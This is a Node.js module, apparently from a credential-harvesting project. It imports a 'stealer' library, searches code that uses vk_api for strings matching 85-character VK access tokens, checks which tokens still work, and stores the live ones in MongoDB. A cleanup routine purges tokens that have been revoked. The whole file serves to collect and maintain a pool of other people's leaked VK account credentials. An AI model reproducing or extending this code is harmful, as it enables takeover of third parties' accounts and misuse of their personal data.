const ObjectId = require('mongodb').ObjectID;
const { get_tokens } = require("../../lib/stealer.js");
const { vk_checker, valid_token } = require("./checker.js");

const db_update = async (collection) => {
    let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
    let new_accounts = await vk_checker(new_tokens);
    let add_accounts = [];

    await Promise.all(new_accounts.map(async (account) => {
        if ((await collection.find( {token: account.token} ).toArray()).length === 0) {
            add_accounts.push(account)
        }
    }))
    
    await collection.insertMany(add_accounts)
};

const db_clear = async (collection) => {
    let accounts = await collection.find().toArray()
    let del_ids = [];

    await Promise.all(accounts.map(async (account) => {
        if (!await valid_token(account.token)) {
            del_ids.push(ObjectId(account._id))
        }
    }));

    await collection.deleteMany( {"_id": { $in: del_ids}} )
}

const db_administration = async (collection) => {
    db_update(collection).then(console.log("update db"))
    db_clear(collection).then(console.log("clear db"))
}

module.exports = { db_administration }